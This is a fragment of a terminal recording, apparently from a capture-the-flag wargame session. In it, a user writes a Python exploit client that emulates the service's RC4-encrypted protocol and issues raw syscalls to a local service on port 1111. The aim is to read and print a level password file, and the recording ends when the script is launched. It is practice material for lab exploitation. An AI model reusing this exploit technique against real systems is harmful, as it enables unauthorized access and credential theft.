[34.594413, "o", "cat > /tmp/drifter0_client.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> import socket, struct, sys, time\r\r\n\u001b[?2004l\r\u001b[?2004h> HOST = \"127.0.0.1\"\r\r\n\u001b[?2004l\r\u001b[?2004h> PORT = 1111\r\r\n\u001b[?2004l\r\u001b[?2004h> def rc4(state, x, y, data):\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf = bytearray(data)\r\r\n\u001b[?2004l\r\u001b[?2004h>     for i in range(len(buf)):\r\r\n\u001b[?2004l\r\u001b[?2004h>         x = (x + 1) % 256\r\r\n\u001b[?2004l\r\u001b[?2004h>         y = (state[x] + y) % 256\r\r\n\u001b[?2004l\r\u001b[?2004h>         state[x], state[y] = state[y], state[x]\r\r\n\u001b[?2004l\r\u001b[?2004h>         buf[i] ^= state[(state[x] + state[y]) % 256]\r\r\n\u001b[?2004l\r\u001b[?2004h>     return state, x, y, bytes(buf)\r\r\n\u001b[?2004l\r\u001b[?2004h> def prepare_key(keymat):\r\r\n\u001b[?2004l\r\u001b[?2004h>     s = list(range(256)); j = 0\r\r\n\u001b[?2004l\r\u001b[?2004h>     for i in range(256):\r\r\n\u001b[?2004l\r\u001b[?2004h>         j = (keymat[i % len(keymat)] + s[i] + j) % 256\r\r\n\u001b[?2004l\r\u001b[?2004h>         s[i], s[j] = s[j], s[i]\r\r\n\u001b[?2004l\r\u001b[?2004h>     return s, 0, 0\r\r\n\u001b[?2004l\r\u001b[?2004h> def call(sock, K, nr, *a):\r\r\n\u001b[?2004l\r\u001b[?2004h>     a = a + (0,) * (8 - len(a))\r\r\n\u001b[?2004l\r\u001b[?2004h>     sti, xi, yi, sto, xo, yo = K\r\r\n\u001b[?2004l\r\u001b[?2004h>     sti, xi, yi, enc = rc4(sti, xi, yi, struct.pack(\"<9I\", nr, *a))\r\r\n\u001b[?2004l\r\u001b[?2004h>     sock.sendall(enc)\r\r\n\u001b[?2004l\r\u001b[?2004h>     r = b\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     while len(r) < 4:\r\r\n\u001b[?2004l\r\u001b[?2004h>         c = sock.recv(4 - len(r))\r\r\n\u001b[?2004l\r\u001b[?2004h>         if not c: raise EOFError\r\r\n\u001b[?2004l\r\u001b[?2004h>         r += c\r\r\n\u001b[?2004l\r\u001b[?2004h>     sto, xo, yo, dec = rc4(sto, xo, yo, r)\r\r\n\u001b[?2004l\r\u001b[?2004h>     return (sti, xi, yi, sto, xo, yo), struct.unpack(\"<i\", dec)[0]\r\r\n\u001b[?2004l\r\u001b[?2004h> s = socket.create_connection((HOST, PORT), timeout=10)\r\r\n\u001b[?2004l\r\u001b[?2004h> me = s.getsockname()          # what the SERVER sees as the peer\r\r\n\u001b[?2004l\r\u001b[?2004h> keymat = socket.inet_aton(me[0]) + struct.pack(\">H\", me[1])\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"keymat:\", keymat.hex())\r\r\n\u001b[?2004l\r\u001b[?2004h> sti, xi, yi = prepare_key(keymat)\r\r\n\u001b[?2004l\r\u001b[?2004h> sto, xo, yo = prepare_key(keymat)\r\r\n\u001b[?2004l\r\u001b[?2004h> for _ in range(42):          # skip 42*6 keystream bytes both ways\r\r\n\u001b[?2004l\r\u001b[?2004h>     sti, xi, yi, _ = rc4(sti, xi, yi, b\"\\0\" * 6)\r\r\n\u001b[?2004l\r\u001b[?2004h>     sto, xo, yo, _ = rc4(sto, xo, yo, b\"\\0\" * 6)\r\r\n\u001b[?2004l\r\u001b[?2004h> K = (sti, xi, yi, sto, xo, yo)\r\r\n\u001b[?2004l\r\u001b[?2004h> K, uid = call(s, K, 24); print(\"getuid ->\", uid)\r\r\n\u001b[?2004l\r\u001b[?2004h> K, page = call(s, K, 192, 0x10000000, 0x1000, 3, 0x22, 0xffffffff, 0)\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"mmap2 ->\", hex(page & 0xffffffff)); page &= 0xffffffff\r\r\n\u001b[?2004l\r\u001b[?2004h> pathfd = None\r\r\n\u001b[?2004l\r\u001b[?2004h> for fd in (3, 4, 5, 6):\r\r\n\u001b[?2004l\r\u001b[?2004h>     K, r = call(s, K, 108, fd, page + 0x400, 0)\r\r\n\u001b[?2004l\r\u001b[?2004h>     if r == 0:\r\r\n\u001b[?2004l\r\u001b[?2004h>         pathfd = fd; break\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"socket fd:\", pathfd)\r\r\n\u001b[?2004l\r\u001b[?2004h> sti, xi, yi, sto, xo, yo = K\r\r\n\u001b[?2004l\r\u001b[?2004h> sti, xi, yi, enc = rc4(sti, xi, yi,\r\r\n\u001b[?2004l\r\u001b[?2004h>     struct.pack(\"<9I\", 3, pathfd, page, 19, 0, 0, 0, 0, 0))\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(enc); s.sendall(b\"/drifter0.password\\0\")\r\r\n\u001b[?2004l\r\u001b[?2004h> r = b\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> while len(r) < 4:\r\r\n\u001b[?2004l\r\u001b[?2004h>     r += s.recv(4 - len(r))\r\r\n\u001b[?2004l\r\u001b[?2004h> sto, xo, yo, dec = rc4(sto, xo, yo, r)\r\r\n\u001b[?2004l\r\u001b[?2004h> K = (sti, xi, yi, sto, xo, yo)\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"read path ->\", struct.unpack(\"<i\", dec)[0])\r\r\n\u001b[?2004l\r\u001b[?2004h> K, fdr = call(s, K, 5, page, 0, 0)\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"open ->\", fdr)\r\r\n\u001b[?2004l\r\u001b[?2004h> K, n = call(s, K, 3, fdr, page + 0x200, 64)\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"read file ->\", n)\r\r\n\u001b[?2004l\r\u001b[?2004h> sti, xi, yi, sto, xo, yo = K\r\r\n\u001b[?2004l\r\u001b[?2004h> sti, xi, yi, enc = rc4(sti, xi, yi,\r\r\n\u001b[?2004l\r\u001b[?2004h>     struct.pack(\"<9I\", 4, pathfd, page + 0x200, n, 0, 0, 0, 0, 0))\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(enc)\r\r\n\u001b[?2004l\r\u001b[?2004h> data = b\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> s.settimeout(5)\r\r\n\u001b[?2004l\r\u001b[?2004h> while len(data) < n + 4:\r\r\n\u001b[?2004l\r\u001b[?2004h>     c = s.recv(64)\r\r\n\u001b[?2004l\r\u001b[?2004h>     if not c: break\r\r\n\u001b[?2004l\r\u001b[?2004h>     data += c\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"EXFIL raw:\", data[:n])\r\r\n\u001b[?2004l\r\u001b"]
[34.59473, "o", "[?2004h> sto, xo, yo, dec = rc4(sto, xo, yo, data[n:n+4])\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"write ->\", struct.unpack(\"<i\", dec)[0])\r\r\n\u001b[?2004l\r\u001b[?2004h> s.close()\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=bbb76708-d665-4046-b6d9-46a2d5af34d1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=drifter0;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/drifter0\u001b\\\u001b]3008;end=bbb76708-d665-4046-b6d9-46a2d5af34d1;exit=success\u001b\\\u001b]3008;start=b0a9e1e7-39b8-461f-ae8d-6aaebf93b5dc;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=drifter0;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/drifter0\u001b\\\u001b[?2004h\u001b]0;drifter0@drifter: ~\u0007drifter0@drifter:~$ "]
[34.805305, "o", "python3 /tmp/drifter0_client.py\r\r\n\u001b[?2004l\r"]
